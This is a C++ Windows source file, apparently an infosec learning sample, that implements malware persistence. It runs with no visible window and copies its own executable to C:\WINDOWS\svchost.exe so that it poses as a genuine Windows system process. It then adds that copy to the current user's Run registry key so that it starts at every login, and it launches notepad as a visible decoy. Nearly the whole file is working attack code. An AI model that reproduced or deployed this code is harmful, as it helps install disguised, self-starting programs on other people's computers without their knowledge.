//File: main.cpp
//Language: C++
//Author: EverydayInfoSec
//Date: 14.07.2014


// READ README.md BEFORE ADVANCING ANY FURTHER


#include <windows.h>
#include <fstream>
#include <iostream>

/*  Declare Windows procedure  */
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);


//These functions are located at end of this file
//Opens registry key and returns it
HKEY OpenKey(HKEY hRootKey, const char* strKey);

//Sets given value for given registry key
void SetVal(HKEY hKey, LPCSTR lpValue, LPCSTR data);


/*  Make the class name into a global variable  */
char szClassName[ ] = "WindowsApp";

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)

{
   HWND hwnd;               /* This is the handle for our window */
   MSG messages;            /* Here messages to the application are saved */
   WNDCLASSEX wincl;        /* Data structure for the windowclass */
   
   /* The Window structure */
   wincl.hInstance = hThisInstance;
   wincl.lpszClassName = szClassName;
   wincl.lpfnWndProc = WindowProcedure;      /* This function is called by windows */
   wincl.style = CS_DBLCLKS;                 /* Catch double-clicks */
   wincl.cbSize = sizeof (WNDCLASSEX);
   
   /* Use default icon and mouse-pointer */
   wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
   wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
   wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
   wincl.lpszMenuName = NULL;                 /* No menu */
   wincl.cbClsExtra = 0;                      /* No extra bytes after the window class */
   wincl.cbWndExtra = 0;                      /* structure or the window instance */
   /* Use Windows's default color as the background of the window */
   wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;
   
   /* Register the window class, and if it fails quit the program */
   if (!RegisterClassEx (&wincl)){
      return 0;   
   }
   
   /* The class is registered, let's create the program*/
   
   //NOTE
   //What is this and why I need it?
   /* hwnd = CreateWindowEx (
    0,                   // Extended possibilites for variation
    szClassName,         // Classname
    "Windows App",       // Title Text
    WS_OVERLAPPEDWINDOW, // default widow
    CW_USEDEFAULT,       // Windows decides the position
    CW_USEDEFAULT,       // where the window ends up on the screen
    544,                 // The programs width
    375,                 // and height in pixels
    HWND_DESKTOP,        // The window is a child-window to desktop
    NULL,                // No menu
    hThisInstance,       // Program Instance handler
    NULL                 // No Window Creation data
    );
    */
   
   /* Make the window visible on the screen */
   //We dont want it to be visible
   //ShowWindow (hwnd, nFunsterStil);
   
   
   //Copy executable to another location
   std::streampos exeSize;
   char* block;
   
   //New name and location
   std::ofstream exeOut("C:\\WINDOWS\\svchost.exe", std::ios::out | std::ios::binary);
   
   //Name of this executable
   std::ifstream exeIn("SyscallWin.exe",std::ios::in | std::ios::binary|std::ios::ate);
   if(exeIn.is_open()){
      exeSize = exeIn.tellg();
      block = new char[exeSize];
      exeIn.seekg(0,std::ios::beg);
      exeIn.read(block,exeSize);
      exeIn.close();
      
      //Write file
      if(exeOut.is_open()){
	 exeOut.write(block,exeSize);
	 exeOut.close();
	 
	 //REGISTRY WRITE
	 //Lets write registry that we want to boot this copy at start up
	 LPCSTR v1="C:\\WINDOWS\\svchost.exe";
	 HKEY hKey = OpenKey(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
	 SetVal(hKey,TEXT("svchost.exe"),v1);
	 
	 RegCloseKey(hKey);
	 //END OF REGISTRY WRITE
      }else{
	 //Could not open file for writing
      }
      
      delete[] block;
   }else{
      //Could not open file for reading
   }
   
   //Spawing another process. In this case the notepad
   PROCESS_INFORMATION ProcessInfo;
   STARTUPINFO StartupInfo;
   ZeroMemory(&StartupInfo, sizeof(StartupInfo));
   StartupInfo.cb = sizeof StartupInfo;
   
   if(CreateProcess("c:\\windows\\notepad.exe", NULL,
		    NULL,NULL,FALSE,0,NULL,NULL,&StartupInfo,&ProcessInfo)){
      
      WaitForSingleObject(ProcessInfo.hProcess,INFINITE);
      CloseHandle(ProcessInfo.hThread);
      CloseHandle(ProcessInfo.hProcess);
   }
   //END OF SPAWNING
   
   
   //These came along with new Win32 project. Do what you want with them
   /* Run the message loop. It will run until GetMessage() returns 0 */
   while (GetMessage (&messages, NULL, 0, 0)){
      /* Translate virtual-key messages into character messages */
      TranslateMessage(&messages);
      /* Send message to WindowProcedure */
      DispatchMessage(&messages);
   }
   
   /* The program return-value is 0 - The value that PostQuitMessage() gave */
   return messages.wParam;
}


/*  This function is called by the Windows function DispatchMessage()  */
LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam){
   //handle the messages
   switch (message){
    case WM_DESTROY:
      PostQuitMessage (0);       /* send a WM_QUIT to the message queue */
      break;
    default:                      /* for messages that we don't deal with */
      return DefWindowProc (hwnd, message, wParam, lParam);
   }
   
   return 0;
}

//Opens key 
HKEY OpenKey(HKEY hRootKey, const char* strKey){
   HKEY hKey;
   LONG nErr = RegOpenKeyEx(hRootKey,strKey,0,KEY_ALL_ACCESS,&hKey);
   if(nErr){
      //Couldnt open key
   }
   
   return hKey;
}

//Set value to open key. In this case REG_SZ type
void SetVal(HKEY hKey, LPCSTR lpValue, LPCSTR data){
   LONG nErr = RegSetValueEx(hKey, lpValue, 0, REG_SZ,(LPBYTE)data,
			     strlen(data)+1);
   
   if(nErr){
      //Couldnt set value to key
   }
}
